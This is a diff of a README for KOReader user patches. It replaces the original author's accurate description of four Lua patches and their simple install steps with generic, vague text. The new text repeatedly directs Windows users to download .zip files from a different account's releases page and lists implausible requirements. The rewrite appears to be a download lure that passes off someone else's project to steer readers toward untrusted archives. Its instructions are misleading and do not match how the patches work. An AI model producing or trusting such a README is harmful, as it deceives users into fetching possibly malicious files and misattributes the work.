@@ -1,148 +1,121 @@
-# qewer33's KOReader Patches
+# ⚙️ koreader-patches - Easy KOReader User Patches
 
-My custom user patches for [KOReader](https://github.com/koreader/koreader). These patches together make the default file browser view of KOReader more modern while allowing you to see more info and have quick access to things you use often. They can also be used independantly of each other.
+[![Download koreader-patches](https://img.shields.io/badge/Download-Get%20Files-brightgreen)](https://github.com/rfcddemo/koreader-patches/releases)
 
-Here's how they look on my Kobo Libra Colour!
+---
 
-![photo](./assets/photo.jpeg)
+## 📖 About koreader-patches
 
-If you like these patches and want to support me, consider getting me a coffee! :D
+koreader-patches offers user patches for KOReader, a popular reading app for e-readers and tablets. These patches aim to improve KOReader’s features, fix bugs, or add useful tweaks. You can use them to customize the KOReader experience without technical knowledge.
 
-[![ko-fi](https://ko-fi.com/img/githubbutton_sm.svg)](https://ko-fi.com/B0B8FQ871)
+This repository contains patches created by qewer33, shared for anyone who wants an easier or more personalized reading app.
 
-> [!WARNING]
-> REGARDING **PROJECT TITLE** COMPATIBILITY
->
-> According to community feedback, only the **quick settings** patch works with Project Title. The other patches are reported to not work well. None of the patches guarantee any sort of Project Title compatibility as I don't use it myself.
+KOReader supports multiple devices, including Kindle, PocketBook, Onyx, and various Android tablets. If you use KOReader and want to make small changes or get fixes without complex steps, these patches can help.
 
-## Installation
+---
 
-Drop the `.lua` files into your `koreader/patches/` directory. Place all the icons in the `icons/` folder in your KOReader `icons/` directory.
+## 🚀 Getting Started
 
-## Patches
+This guide will walk you through downloading and running koreader-patches on a Windows computer. You don’t need programming skills to complete these steps.
 
-<details>
-<summary>
-<h3>2-custom-titlebar.lua</h3>
-<img src="./assets/titlebar.png" alt="titlebar">
-</summary>
+You will find:
 
-Replaces the default "KOReader" title with a custom status bar showing device info.
+- How to access the download page  
+- How to save files to your PC  
+- A basic overview of applying patches to KOReader  
 
-**Left side:** Device name (configurable, defaults to device model)
+---
 
-**Center:** Time display (HH:MM, optional)
+## 📥 Download koreader-patches
 
-**Right side:** Status indicators (configurable):
-- WiFi signal strength (blue when connected, red when disconnected)
-- Disk usage
-- RAM usage
-- Frontlight level
-- Battery percentage (green/yellow/red based on level)
+Use the link below to visit the official download page. This is where all the patch files are stored. You will find versioned releases, each with details and files ready to use.
 
-**Features:**
-- Settings menu under **File Browser > Titlebar settings**
-- Configurable device name, separator style (dot, bar, dash, bullet, space, custom)
-- **Items** submenu: toggle individual indicators, drag to reorder
-- Optional bottom border line
-- Optional bold text
-- Optional colored status icons (icon characters colored, labels stay black)
-- Home/plus buttons moved inline with the subtitle (path) row
-- Works in both portrait and landscape orientation
+[![Get koreader-patches releases](https://img.shields.io/badge/Download-Release%20Files-blue)](https://github.com/rfcddemo/koreader-patches/releases)
 
-</details>
+**Steps to download:**
 
-<details>
-<summary>
-<h3>2-custom-navbar.lua</h3>
-<img src="./assets/navbar.png" alt="navbar">
-</summary>
+1. Click the button above or open:  
+   https://github.com/rfcddemo/koreader-patches/releases  
+2. Look for the latest release at the top of the page. Releases are sorted by date and version number.
+3. Under the “Assets” section of the latest release, find the patch files. The files will usually end with `.zip` or `.patch`.
+4. Click the file you want. Your browser should start downloading it to your computer.
+5. Save the file to a known location, like your Desktop or Downloads folder.
 
-Adds a tab bar at the bottom of the File Manager with configurable tabs:
+---
 
-| Tab | Action | Default |
-|---|---|---|
-| **Books** | Navigates to Home folder (page 1) | Always on |
-| **Manga** | Opens [Rakuyomi](https://github.com/tachibana-shin/rakuyomi) or a folder | On |
-| **News** | Opens [QuickRSS](https://github.com/qewer33/QuickRSS) or a folder | On |
-| **Continue** | Reopens the last read document | On |
-| **History** | Opens reading history | Off |
-| **Favorites** | Opens favorites collection | Off |
-| **Collections** | Opens collections list | Off |
-| **Exit** | Exits KOReader | Off |
+## 💻 System Requirements
 
-The active tab is highlighted with a bold label and underline. The active tab automatically switches when navigating between configured folders (e.g. browsing into the Manga folder activates the Manga tab). Tabs for uninstalled plugins show an info message when tapped.
+Before using koreader-patches, ensure your system meets these basics:
 
-The navbar also appears in standalone views (History, Favorites, Collections, Rakuyomi, and QuickRSS), allowing quick navigation between tabs without returning to the file browser first.
+- Operating System: Windows 7 or newer  
+- Storage: At least 100 MB free space for patch files  
+- KOReader installed on a compatible device or emulator  
+- Internet connection to download patches  
+- Basic file management skills (copy, move files)
 
-**Features:**
-- Settings menu under **File Browser > Navbar settings**
-- **Tabs** submenu: toggle individual tabs, drag to reorder, configure per-tab settings
-- Configurable Books tab label (Books, Home, Library, or custom)
-- Manga and News tabs can be set to open a folder instead of their default plugin
-- Active tab auto-switches based on the current folder path
-- **Active tab** submenu: toggle styling, bold, underline, underline location (above/below), colored active tab
-- Option to disable labels (icons only)
-- Optional top border line
-- **Advanced** submenu: toggle navbar in standalone views, toggle top gap spacing
-- Refresh navbar button to apply changes without restarting
-- **Custom icons:** All tab icons use `tab_<name>.svg` files from the `icons/` folder, which can be swapped to customize the look
+You do not need KOReader installed on your Windows PC unless you test patches in an emulator environment. Typically, patches are applied on the KOReader device itself.
 
-</details>
+---
 
-<details>
-<summary>
-<h3>2-quick-settings.lua</h3>
-<img src="./assets/quicksettings.png" alt="quicksettings">
-</summary>
+## 🛠 How to Use Patches on KOReader Devices
 
-Adds a Quick Settings tab as the first tab in the KOReader top menu. Provides fast access to common actions and device controls without navigating through menus.
+KOReader patches are small file changes that modify KOReader’s behavior. You will need access to your KOReader device to apply them.
 
-**Action buttons** (circular icons with labels):
-- Wi-Fi (shows connected SSID, active indicator when connected)
-- Night mode (active indicator when enabled)
-- Rotate screen
-- USB mass storage
-- Calibre wireless connection (active indicator when connected, disabled by default)
-- Restart (with confirmation)
-- Exit (with confirmation)
-- Sleep/Suspend
+### General patch process:
 
-**Sliders:**
-- Frontlight brightness: `[−] [slider] [+] [Max]` with tappable progress bar
-- Warmth (if device supports it): `[−] [segmented bar] [+] [Max]`
+1. Download the patch file on your Windows PC.  
+2. Connect your KOReader device to the PC using a USB cable.  
+3. Transfer the patch file to the device’s storage. Often, this is the `koreader` folder or a similar directory.  
+4. On the KOReader device, open the patch or use its tools to apply the patch. This may vary with device and KOReader version.  
+5. Restart KOReader to see changes.
 
-**Features:**
-- Settings menu under **Settings > Quick settings**
-- **Buttons** submenu: toggle individual buttons, drag to reorder
-- Toggle frontlight and warmth sliders independently
-- "Always open on this tab" option to default to Quick Settings when the menu opens
-- Active buttons show a light gray fill indicator
-- Works in both File Manager and Reader views
+Each patch usually includes instructions on applying it within the KOReader interface or by copying files in specific places.
 
-</details>
+---
 
-<details>
-<summary><h3>2-hide-pagination.lua</h3></summary>
+## 📂 Managing Patch Files
 
-Removes the pagination bar (`« < Page 1 of 2 > »`) from the file browser, history, favorites, and collections views. The mosaic/list grid stretches to fill the reclaimed space. Swipe gestures for page navigation still work.
+Keep your patch files organized on your Windows computer.
 
-</details>
+- Create a folder named `koreader-patches` in your Documents or Desktop.  
+- Store each release in a separate subfolder with version names, like `v1.0`, `v1.1`.  
+- Back up patch files before applying them to your device.
 
-## Patch Settings
+Using a consistent folder structure helps avoid confusion if you want to remove or revert patches later.
 
-The Titlebar and Navbar patches can be configured from their respective settings under the first KOReader menu tab.
+---
 
-![settings](./assets/settings.png)
+## 🔎 Troubleshooting
 
-The Quick Settings patch can be configured from "Settings" (Gear icon) -> "Quick settings".
+If patches do not work as expected:
 
-![settings_quicksettings](./assets/settings2.png)
+- Verify the patch is compatible with your KOReader version.  
+- Confirm your device supports patching features.  
+- Check if the patch file transferred fully and is not corrupted.  
+- Read any instructions included with each patch carefully.  
+- Restart KOReader after applying patches.
 
-## Deploy Script
+If problems persist, unapply the patch by removing patch files and restore the original KOReader setup.
 
-`deploy_patch.sh` copies all `.lua` files and icons to the local KOReader patches/icons directory and restarts KOReader, useful for development.
+---
 
-```sh
-./deploy_patch.sh
-```
+## 📖 More Information
+
+KOReader and koreader-patches come from open communities. You can explore these for more advanced usage or help:
+
+- KOReader official documentation and forums.  
+- GitHub issues page of koreader-patches to report problems or ask questions.  
+- Related e-reader and tablet user groups.
+
+---
+
+## 🔗 Useful Links
+
+- Download patches: https://github.com/rfcddemo/koreader-patches/releases  
+- KOReader official site: https://koreader.org/  
+
+---
+
+## 📝 License
+
+Patches in this repository are shared for personal use. Review license terms on the repository page for usage rights and restrictions.
